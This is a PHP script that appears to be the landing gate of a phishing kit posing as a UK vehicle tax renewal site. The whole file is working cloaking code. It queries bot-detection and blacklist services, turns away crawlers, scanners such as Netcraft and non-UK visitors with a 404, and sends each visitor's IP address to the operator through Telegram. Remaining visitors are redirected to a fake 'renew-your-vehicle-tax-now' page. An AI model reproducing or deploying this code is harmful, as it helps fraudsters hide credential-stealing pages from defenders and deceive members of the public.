<?php
error_reporting(E_ALL);
session_start();
require "configg.php";
require "vtu_assetz/dinc/functions.php";

$ip = $_SERVER['REMOTE_ADDR'];

function DatabaseBotBlacklist($ip) {
    $url = "https://bot.myip.ms/" . $ip;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");

    $response = curl_exec($ch);
    curl_close($ch);

    if (strpos($response, "Web Bot exists on this IP address and Listed in Myip.ms Web Bot list") !== false) {
        return true;
    }
    return false;
}

function OwnBot($ip) {
    $blackboxUrl = "https://blackbox.ipinfo.app/lookup/{$ip}";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $blackboxUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $blackboxResponse = curl_exec($ch);
    curl_close($ch);

    if ($blackboxResponse && trim($blackboxResponse) === 'Y') {
        return true;
    }

    return false;
}

if ($parameter_status == 1) {
    if ($parameter === null) {
        $ip = $_SERVER['REMOTE_ADDR'];
        $fp = fopen("vtu_assetz/dinc/blacklist.dat", "a");
        fputs($fp, "$ip\n");
        fclose($fp);
        header_remove();
        header("Connection: close\r\n");
        http_response_code(404);
        exit;
    }
}

if (DatabaseBotBlacklist($ip)) {
    $fp = fopen("vtu_assetz/dinc/blacklist.dat", "a");
	fputs($fp, "$ip\r\n");
	fclose($fp);
	header_remove();
	header("Connection: close\r\n");
	http_response_code(404);
	exit;
}

if (OwnBot($ip)) {
    $fp = fopen("vtu_assetz/dinc/blacklist.dat", "a");
	fputs($fp, "$ip\r\n");
	fclose($fp);
	header_remove();
	header("Connection: close\r\n");
	http_response_code(404);
	exit;
}

if($telegram_delivery2 == 1){
	$str = $_SERVER['REMOTE_ADDR'];
	telegram_deliver($chat_id2,$str,$bot_token2);
}
if($internal_antibot == 1){
	require "vtu_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("vtu_assetz/dinc/blacklist.dat", "a");
		fputs($fp, "$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "vtu_assetz/mob_lock.php";
}
if($UK_lock == 1){
	if(onlyuk() == true){
	
	}else{
		$fp = fopen("vtu_assetz/dinc/blacklist.dat", "a");
		fputs($fp, "$ip\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("vtu_assetz/dinc/blacklist.dat", "a");
		fputs($fp, "$ip\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
$rand = generateRandomString(130);
require "vtu_assetz/dinc/visitor_log.php";
require "vtu_assetz/dinc/netcraft_check.php";
require "vtu_assetz/dinc/blacklist_lookup.php";
require "vtu_assetz/dinc/ip_range_check.php";
header("Location: renew-your-vehicle-tax-now?sslchannel=true&sessionid=$rand");
?>